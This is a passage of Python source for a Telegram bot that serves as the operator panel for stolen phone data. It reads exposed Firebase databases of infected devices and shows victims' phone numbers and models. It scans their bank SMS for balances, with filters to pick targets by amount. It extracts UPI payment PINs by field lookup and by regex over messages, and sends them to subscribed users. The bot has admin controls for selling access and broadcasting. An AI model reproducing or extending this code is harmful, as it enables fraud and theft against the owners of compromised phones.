                "🔍 <b>ENTER USER ID TO GRANT ACCESS:</b>\n\n(Send the User ID as a message)",
                parse_mode="HTML"
            )
            ctx.user_data["awaiting_admin_user_id"] = True
            return

        elif text == "🚫 REMOVE ACCESS":
            await update.message.reply_text(
                "🚫 <b>ENTER USER ID TO REMOVE ACCESS:</b>\n\n(Send the User ID as a message)",
                parse_mode="HTML"
            )
            ctx.user_data["awaiting_admin_ban_id"] = True
            return

        elif text == "📢 BROADCAST":
            await update.message.reply_text(
                "📢 <b>ENTER BROADCAST MESSAGE:</b>\n\n(This will be sent to all users)",
                parse_mode="HTML"
            )
            ctx.user_data["awaiting_admin_broadcast"] = True
            return

        # --- ADMIN TEXT STATES ---
        if ctx.user_data.get("awaiting_admin_user_id"):
            ctx.user_data["awaiting_admin_user_id"] = False
            try:
                target_id = int(update.message.text)
                user = await get_user(target_id)
                if not user:
                    return await update.message.reply_text(
                        "❌ <b>USER NOT FOUND!</b>\nUser must start the bot first.",
                        parse_mode="HTML"
                    )
                await update.message.reply_text(
                    f"👤 User <code>{target_id}</code> found.\n\n⏳ <b>Select Duration:</b>",
                    reply_markup=get_days_kb(target_id, admin_mode=True),
                    parse_mode="HTML"
                )
            except ValueError:
                await update.message.reply_text(
                    "❌ <b>INVALID ID!</b> Please send numbers only.", parse_mode="HTML"
                )
            return

        elif ctx.user_data.get("awaiting_admin_ban_id"):
            ctx.user_data["awaiting_admin_ban_id"] = False
            try:
                target_id = int(update.message.text)
                await ban_user_db(target_id)
                await _cancel_user_tasks(target_id)
                await update.message.reply_text(
                    f"🚫 <b>USER BANNED!</b>\n\nUser <code>{target_id}</code> has been banned & scanner stopped.",
                    parse_mode="HTML"
                )
            except ValueError:
                await update.message.reply_text("❌ <b>INVALID ID!</b>", parse_mode="HTML")
            return

        elif ctx.user_data.get("awaiting_admin_broadcast"):
            ctx.user_data["awaiting_admin_broadcast"] = False
            await broadcast_handler(update, ctx)
            return

    # --- USER INPUT STATES ---
    if ctx.user_data.get("awaiting_filter"):
        ctx.user_data["awaiting_filter"] = False
        try:
            parts = text.split()
            state["filter_min"] = float(parts[0])
            state["filter_max"] = float(parts[1]) if len(parts) > 1 else 0.0
            await update.message.reply_text(
                f"✅ <b>FILTER APPLIED</b>\nMin: ₹{state['filter_min']} | Max: ₹{state['filter_max']}",
                parse_mode="HTML"
            )
        except Exception:
            await update.message.reply_text(
                "❌ <b>INVALID FORMAT!</b> Example: <code>100 5000</code>",
                parse_mode="HTML"
            )
        return

    if ctx.user_data.get("awaiting_search"):
        ctx.user_data["awaiting_search"] = False
        await perform_realtime_search(update, ctx, text, state)
        return

    await process_urls(update, ctx, text)

# ══════════════════════════════════════════════════════
# 📢 BROADCAST
# ══════════════════════════════════════════════════════
async def broadcast_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user_ids = await get_all_user_ids()
    if not user_ids:
        return await update.message.reply_text("❌ No users to broadcast.", parse_mode="HTML")

    status_msg = await update.message.reply_text(
        f"⏳ <b>Broadcasting to {len(user_ids)} users...</b>", parse_mode="HTML"
    )

    success = 0
    fail = 0
    src_chat = update.message.chat_id
    src_msg = update.message.message_id

    async def send_one(uid):
        try:
            await ctx.bot.copy_message(
                chat_id=uid, from_chat_id=src_chat, message_id=src_msg
            )
            return True
        except Exception:
            return False

    for i in range(0, len(user_ids), 25):
        batch = user_ids[i:i + 25]
        results = await asyncio.gather(
            *[send_one(uid) for uid in batch], return_exceptions=True
        )
        for r in results:
            if r is True:
                success += 1
            else:
                fail += 1
        await asyncio.sleep(1)
        if i % 100 == 0 and i > 0:
            try:
                await status_msg.edit_text(
                    f"⏳ <b>Broadcasting...</b>\n✅ {success} | ❌ {fail}",
                    parse_mode="HTML"
                )
            except Exception:
                pass

    await status_msg.edit_text(
        f"✅ <b>BROADCAST COMPLETE</b>\n\n🟢 Sent: {success}\n🔴 Failed: {fail}",
        parse_mode="HTML"
    )

# ══════════════════════════════════════════════════════
# 📁 DOCUMENT HANDLER
# ══════════════════════════════════════════════════════
async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await check_auth(update, ctx):
        return

    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        return await update.message.reply_text(
            "❌ <b>ONLY .TXT FILES ARE ALLOWED!</b>", parse_mode="HTML"
        )

    msg = await update.message.reply_text("⏳ <b>READING FILE...</b>", parse_mode="HTML")
    file_path = os.path.join(DATA_DIR, f"temp_{user_id}_{int(time.time())}.txt")
    try:
        file = await ctx.bot.get_file(doc.file_id)
        await file.download_to_drive(file_path)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    except Exception as e:
        logger.error(f"file read fail uid={user_id}: {e}")
        try:
            await msg.edit_text("❌ <b>FILE READ FAILED!</b>", parse_mode="HTML")
        except Exception:
            pass
        return
    finally:
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except Exception:
                pass

    await process_urls(update, ctx, content, msg)

# ══════════════════════════════════════════════════════
# 🔍 SEARCH (SIRF ONLINE)
# ══════════════════════════════════════════════════════
async def perform_realtime_search(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
                                   keyword: str, state):
    state["search_active"] = True
    state["scan_active"] = False
    local_kill = state["kill_switch"]
    msg = await update.message.reply_text(
        f"⚡ <b>SEARCHING FOR '{keyword}'...</b>", parse_mode="HTML"
    )
    found_count = 0
    sem = asyncio.Semaphore(5)
    stopped = False

    async def search_dev(fb, dev):
        nonlocal found_count
        if local_kill.is_set():
            return
        async with sem:
            if local_kill.is_set():
                return
            mdata = await fb_get(fb["url"], f"messages/{dev['id']}", timeout=5)
            if not mdata or local_kill.is_set():
                return
            msgs = parse_msgs(mdata)
            matches = [
                m for m in msgs
                if keyword.lower() in m["message"].lower() and is_recent(m["timestamp"])
            ]
            if not matches:
                return
            pin = dev.get("upipin", "").split("|")[0].strip()
            card = "🎯 <b>MATCH FOUND</b>\n"
            card += f"📁 <b>DB:</b> <code>{fb['label']}</code> | 🆔 <b>ID:</b> <code>{dev['id']}</code>\n"
            card += f"📱 {dev['mobNo']} | 📲 {dev['model']}\n"
            if pin:
                card += f"🔐 <b>UPI PIN:</b> <code>{pin}</code>\n"
            card += "━━━━━━━━━━━━━━━━━━━━\n"
            for i, m in enumerate(matches[:3], 1):
                card += f"<b>{i}.</b> <i>{m['message'][:150]}...</i>\n\n"
            try:
                await update.message.reply_text(card, parse_mode="HTML")
                found_count += 1
            except Exception as e:
                logger.debug(f"search card send fail: {e}")

    try:
        for fb in list(state["firebases"].values()):
            if local_kill.is_set():
                stopped = True
                break
            data = await fb_get(fb["url"], "clients", timeout=5)
            if not data or local_kill.is_set():
                continue
            devices = parse_devices(data)   # ✅ SIRF ONLINE
            await asyncio.gather(
                *[search_dev(fb, d) for d in devices], return_exceptions=True
            )

        if stopped or local_kill.is_set():
            try:
                await msg.edit_text(
                    f"🛑 <b>SEARCH STOPPED</b>\nFound so far: <b>{found_count}</b>",
                    parse_mode="HTML"
                )
            except Exception:
                pass
        else:
            await msg.edit_text(
                f"✅ <b>SEARCH COMPLETE</b>\nFound <b>{found_count}</b> devices.",
                parse_mode="HTML"
            )
    except asyncio.CancelledError:
        try:
            await msg.edit_text("🛑 <b>SEARCH CANCELLED</b>", parse_mode="HTML")
        except Exception:
            pass
        raise
    finally:
        state["search_active"] = False

# ══════════════════════════════════════════════════════
# 🫆 UPI SCAN (SIRF ONLINE)
# ══════════════════════════════════════════════════════
async def scan_upi_pins(ctx: ContextTypes.DEFAULT_TYPE, user_id: int, state):
    local_kill = state["kill_switch"]
    found_count = 0
    stopped = False
    sem = asyncio.Semaphore(5)

    async def check_dev(fb, dev):
        nonlocal found_count
        if local_kill.is_set():
            return
        async with sem:
            if local_kill.is_set():
                return

            pin = dev.get("upipin", "").strip()

            # Agar clients node se nahi mila, messages se dhundo
            if not pin:
                mdata = await fb_get(fb["url"], f"messages/{dev['id']}", timeout=4)
                if mdata and not local_kill.is_set():
                    for m in parse_msgs(mdata):
                        match = re.search(
                            r'(?:upi\s*pin|pin\s*(?:is|set|:)|create\s*pin)'
                            r'[^\d]{0,10}(\d{4,6})',
                            m["message"], re.IGNORECASE
                        )
                        if match:
                            pin = match.group(1)
                            break

            if not pin or local_kill.is_set():
                return

            dev_copy = dict(dev)
            dev_copy["upipin"] = pin
            try:
                await ctx.bot.send_message(
                    user_id, format_upi_card(fb["label"], dev_copy), parse_mode="HTML"
                )
                found_count += 1
            except Exception as e:
                logger.debug(f"upi card send fail uid={user_id}: {e}")

    try:
        for fb in list(state["firebases"].values()):
            if local_kill.is_set():
                stopped = True
                break
            data = await fb_get(fb["url"], "clients", timeout=5)
            if not data or local_kill.is_set():
                continue
            devices = parse_devices(data)   # ✅ SIRF ONLINE
            await asyncio.gather(
                *[check_dev(fb, d) for d in devices], return_exceptions=True
            )

        if stopped or local_kill.is_set():
            try:
                await ctx.bot.send_message(
                    user_id,
                    f"🛑 <b>UPI SCAN STOPPED</b>\nFound so far: <b>{found_count}</b>",
                    parse_mode="HTML"
                )
            except Exception:
                pass
        else:
            await ctx.bot.send_message(
                user_id,
                f"✅ <b>UPI SCAN COMPLETE</b>\nFound <b>{found_count}</b> devices.",
                parse_mode="HTML"
            )
    except asyncio.CancelledError:
        try:
            await ctx.bot.send_message(
                user_id, "🛑 <b>UPI SCAN CANCELLED</b>", parse_mode="HTML"
            )
        except Exception:
            pass
        raise
    except Exception as e:
        logger.error(f"upi scan crash uid={user_id}: {e}", exc_info=True)
    finally:
        state["upi_active"] = False

# ══════════════════════════════════════════════════════
# 📥 PROCESS URLS
# ══════════════════════════════════════════════════════
async def process_urls(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
                       text: str, msg=None):
    state = get_user_state(update.effective_user.id)
    urls = re.findall(
        r'https?://[a-zA-Z0-9\-]+(?:\.[a-zA-Z0-9\-]+)*'
        r'\.(?:firebaseio\.com|firebasedatabase\.app)',
        text
    )
    urls = list(set(urls))
    if not urls:
        if msg:
            try:
                await msg.edit_text("❌ <b>INVALID FIREBASE URL</b>", parse_mode="HTML")
            except Exception:
                pass
        return

    if not msg:
        msg = await update.message.reply_text(
            f"🔍 <b>PROCESSING {len(urls)} URLs...</b>", parse_mode="HTML"
        )
    else:
        try:
            await msg.edit_text(
                f"🔍 <b>PROCESSING {len(urls)} URLs...</b>", parse_mode="HTML"
            )
        except Exception:
            pass

    results = await asyncio.gather(
        *[validate_firebase(u) for u in urls], return_exceptions=True
    )
    added = 0
    for url, is_valid in zip(urls, results):
        if is_valid is True and url not in state["firebases"]:
            state["firebases"][url] = {
                "url": url,
                "label": url.split("//")[1].split(".")[0],
            }
            added += 1

    report = (
        f"✅ <b>{added} NEW DATABASE(S) ADDED</b>\n"
        f"Total: <b>{len(state['firebases'])}</b>\n\n"
        f"👉 <i>Use the menu below to start scanning.</i>"
    )
    try:
        await msg.edit_text(report, parse_mode="HTML")
    except Exception:
        pass

# ══════════════════════════════════════════════════════
# ⚡ BACKGROUND SCANNER (SIRF ONLINE)
# ══════════════════════════════════════════════════════
async def background_scanner(bot, user_id: int, state):
    local_kill = state["kill_switch"]
    sem = asyncio.Semaphore(10)

    async def process_device(fb, dev):
        if local_kill.is_set():
            return
        async with sem:
            if local_kill.is_set():
                return
            mdata = await fb_get(fb["url"], f"messages/{dev['id']}", timeout=5)
            if not mdata or local_kill.is_set():
                return

            valid_bank_msgs = [
                m for m in parse_msgs(mdata)
                if is_bank_sms(m["message"]) and is_recent(m["timestamp"])
            ]
            if not valid_bank_msgs or local_kill.is_set():
                return

            latest_bal = extract_balance_float(valid_bank_msgs[0]["message"])
            if latest_bal >= 0:
                if state["filter_min"] > 0 and latest_bal < state["filter_min"]:
                    return
                if state["filter_max"] > 0 and latest_bal > state["filter_max"]:
                    return

            if local_kill.is_set():
                return

            state_key = f"{fb['url']}|{dev['id']}"
            card_text = format_deep_scan_card(fb["label"], dev, valid_bank_msgs[:5])
            bal_str = str(latest_bal)
            prev = state["device_state"].get(state_key)
            try:
                if prev is None:
                    sent = await bot.send_message(user_id, card_text, parse_mode="HTML")
                    state["device_state"][state_key] = {
                        "msg_id": sent.message_id,
                        "bal": bal_str,
                    }
                elif prev["bal"] != bal_str:
                    await bot.edit_message_text(
                        chat_id=user_id, message_id=prev["msg_id"],
                        text=card_text, parse_mode="HTML"
                    )
                    prev["bal"] = bal_str
            except asyncio.CancelledError:
                raise
            except Exception as e:
                logger.debug(f"card send/edit fail uid={user_id}: {e}")

    try:
        while not local_kill.is_set():
            if not state["scan_active"]:
                logger.info(f"scanner exiting (inactive) uid={user_id}")
                return
            if not state["firebases"]:
                await asyncio.sleep(1)
                continue

            for fb in list(state["firebases"].values()):
                if local_kill.is_set():
                    return
                data = await fb_get(fb["url"], "clients", timeout=6)
                if not data or local_kill.is_set():
                    continue
                devices = parse_devices(data)   # ✅ SIRF ONLINE
                try:
                    await asyncio.wait_for(
                        asyncio.gather(
                            *[process_device(fb, d) for d in devices],
                            return_exceptions=True
                        ),
                        timeout=60
                    )
                except asyncio.TimeoutError:
                    logger.warning(f"scanner gather timeout uid={user_id} fb={fb['label']}")
                if local_kill.is_set():
                    return

            for _ in range(3):
                if local_kill.is_set():
                    return
                await asyncio.sleep(0.5)
    except asyncio.CancelledError:
        logger.info(f"scanner cancelled user={user_id}")
        return
    except Exception as e:
        logger.error(f"scanner crash user={user_id}: {e}", exc_info=True)
    finally:
        state["scan_active"] = False

# ══════════════════════════════════════════════════════
# 🚀 BOT STARTUP
# ══════════════════════════════════════════════════════
async def post_init(app: Application):
    asyncio.create_task(cleanup_loop())
    logger.info("cleanup_loop started")

async def run_bot():
    if not BOT_TOKEN:
        print("BOT_TOKEN missing")
        return

    await init_db()

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .request(
            HTTPXRequest(
                connect_timeout=20,
                read_timeout=20,
                write_timeout=20,
                pool_timeout=20,
                connection_pool_size=50,
            )
        )
        .concurrent_updates(20)
        .post_init(post_init)
        .build()
    )

    try:
        me = await app.bot.get_me()
        print(f"✅ Bot Started Successfully: @{me.username}")
        print(f"👑 Owner ID: {OWNER_ID}")
    except Exception as e:
        print(f"❌ Bot Start Failed: {e}")
        return

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(handle_inline_buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_document))

    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)

    try:
        await asyncio.Event().wait()
    finally:
        logger.info("Shutting down...")
        for uid in list(ACTIVE_TASKS.keys()):
            await _cancel_user_tasks(uid)
        await close_http()
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

if __name__ == "__main__":
    asyncio.run(run_bot())
